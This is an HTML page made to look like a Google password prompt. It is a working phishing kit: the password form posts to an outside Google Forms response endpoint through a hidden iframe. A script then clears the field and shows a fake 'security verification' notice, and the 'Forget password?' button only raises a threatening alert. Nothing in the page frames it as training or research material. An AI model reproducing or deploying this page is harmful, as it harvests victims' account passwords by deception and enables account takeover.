<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google • password</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background: #ffffff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .google-password-card {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            background: white;
            text-align: center;
        }

        .google-wordmark {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 1px;
            font-size: 2.2rem;
            font-weight: 500;
            margin-bottom: 30px;
        }

        .g-blue { color: #4285f4; }
        .o-red { color: #ea4335; }
        .o-yellow { color: #fbbc04; }
        .g-green { color: #34a853; }
        .l-green { color: #34a853; }
        .e-blue { color: #4285f4; }

        .sign-in-prompt {
            font-size: 1.1rem;
            color: #202124;
            margin-bottom: 30px;
        }

        .password-group {
            text-align: left;
            margin-bottom: 30px;
        }

        .password-label {
            display: block;
            color: #5f6368;
            font-size: 0.9rem;
            margin-bottom: 8px;
        }

        .password-input-field {
            width: 100%;
            padding: 13px 15px;
            font-size: 1rem;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            background: #fff;
        }

        .password-input-field:focus {
            border-color: #4285f4;
            box-shadow: inset 0 1px 2px rgba(0,0,0,0.1), 0 0 0 2px #e8f0fe;
        }

        .action-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 10px;
        }

        .forget-link {
            color: #1a73e8;
            background: none;
            border: none;
            font-size: 0.9rem;
            font-weight: 500;
            cursor: pointer;
            padding: 5px 8px;
        }

        .forget-link:hover {
            background-color: #f1f3f4;
            border-radius: 4px;
        }

        .next-button {
            background-color: #1a73e8;
            border: none;
            color: white;
            font-size: 0.95rem;
            font-weight: 500;
            padding: 9px 24px;
            border-radius: 4px;
            cursor: pointer;
            float: right;
        }

        .next-button:hover {
            background-color: #1b66c9;
        }

        .clearfix::after {
            content: "";
            clear: both;
            display: table;
        }

        .security-message {
            background-color: #fef9e7;
            border-left: 4px solid #fbbc04;
            padding: 12px 16px;
            margin-top: 20px;
            font-size: 0.85rem;
            color: #5f6368;
            text-align: left;
            border-radius: 4px;
            display: none;
        }

        .security-message strong {
            color: #ea4335;
            font-weight: 600;
        }

        .security-icon {
            font-size: 1.1rem;
            margin-right: 6px;
            vertical-align: middle;
        }

        .info-message {
            font-size: 0.8rem;
            color: #5f6368;
            margin-top: 40px;
            border-top: 1px solid #e8eaed;
            padding-top: 24px;
            text-align: left;
        }

        .footer-brand {
            margin-top: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
            font-size: 0.85rem;
            color: #5f6368;
        }
    </style>
</head>
<body>

<div class="google-password-card">
    <div class="google-wordmark">
        <span class="g-blue">G</span>
        <span class="o-red">o</span>
        <span class="o-yellow">o</span>
        <span class="g-green">g</span>
        <span class="l-green">l</span>
        <span class="e-blue">e</span>
    </div>
    
    <div class="sign-in-prompt">Google • enter password</div>

    <!-- FIXED FORM WITH CORRECT ENTRY ID -->
    <form action="https://docs.google.com/forms/d/e/1FAIpQLSfM-AByaxeL9ttKk3grTWyHx6vvfhJvsdM_u3iSMgEG8sSYBw/formResponse" method="POST" target="hidden_iframe">
        <div class="password-group">
            <label class="password-label" for="password-field">Enter your password</label>
            <input class="password-input-field" type="password" id="password-field" 
                   name="entry.1706115546" 
                   placeholder="Enter password here" 
                   required>
        </div>
        
        <div class="action-row clearfix">
            <button type="button" class="forget-link" onclick="alert('Unavailable account will be forfeited')">Forget password?</button>
            <button type="submit" class="next-button" id="submitBtn">Next</button>
        </div>
    </form>

    <!-- HIDDEN IFRAME -->
    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>

    <!-- SECURITY MESSAGE -->
    <div id="securityMessage" class="security-message">
        <span class="security-icon">🛡️</span> <strong>Security verification in progress:</strong> Your account security issues will be verified within 24 hours. You may receive a verification email.
    </div>

    <div class="info-message">
        <span>👤 Signed in as <strong>visitor</strong></span><br>
        <span style="display:inline-block; margin-top:12px;">🔒 Your device is trusted</span>
    </div>
</div>

<div class="footer-brand">
    <span>Google</span> <span>• password page</span>
</div>

<script>
    const form = document.querySelector('form');
    const passwordField = document.getElementById('password-field');
    const securityMessage = document.getElementById('securityMessage');
    
    form.addEventListener('submit', function() {
        // Clear password field
        setTimeout(function() {
            passwordField.value = '';
        }, 200);
        
        // Show security message
        securityMessage.style.display = 'block';
        
        // Hide after 8 seconds
        setTimeout(function() {
            securityMessage.style.display = 'none';
        }, 8000);
    });
</script>

</body>
</html>
